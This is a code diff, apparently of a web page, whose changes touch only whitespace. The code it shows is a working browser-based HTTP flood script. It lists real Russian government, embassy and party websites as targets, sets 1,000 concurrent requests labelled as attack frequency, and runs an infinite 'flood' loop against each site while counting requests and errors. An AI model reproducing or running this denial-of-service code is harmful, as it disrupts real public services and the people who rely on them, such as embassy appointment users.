@@ -181,13 +181,13 @@ if($input_noun != ""){
            'https://tokyo.kdmid.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // ロシア大使館(訪問予約サイト)
            'https://spravedlivo.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },                  // 公正ロシア
            'http://www.yuzhnokurilsk.ru/': { number_of_requests: 0, number_of_errored_responses: 0 },             // 南クリル管区
-           'http://xn----8sbmnjbgm3ams5i.xn--p1ai/': { number_of_requests: 0, number_of_errored_responses: 0 },   // クリル管区                          
+           'http://xn----8sbmnjbgm3ams5i.xn--p1ai/': { number_of_requests: 0, number_of_errored_responses: 0 },   // クリル管区
     	  }    
       
       // 1秒ごとの攻撃頻度
       var CONCURRENCY_LIMIT = 1000
       var queue = []
-      
+
       // リクエスト送信
       async function fetchWithTimeout(resource, options) {
         // コントローラーを取得
@@ -203,12 +203,12 @@ if($input_noun != ""){
           clearTimeout(id);
           return response;
         }).catch((error) => {
-            console.log(error.code);
+          console.log(error.code);
           clearTimeout(id);
           throw error;
         });
       }
-    
+
       // 各ターゲットに攻撃する。
       async function flood(target) {
         //for文を使った無限ループ
@@ -240,7 +240,7 @@ if($input_noun != ""){
                 // リクエスト数を追加する。
                 targets[target].number_of_requests++;
               })
-            
+
           )
         }
       }
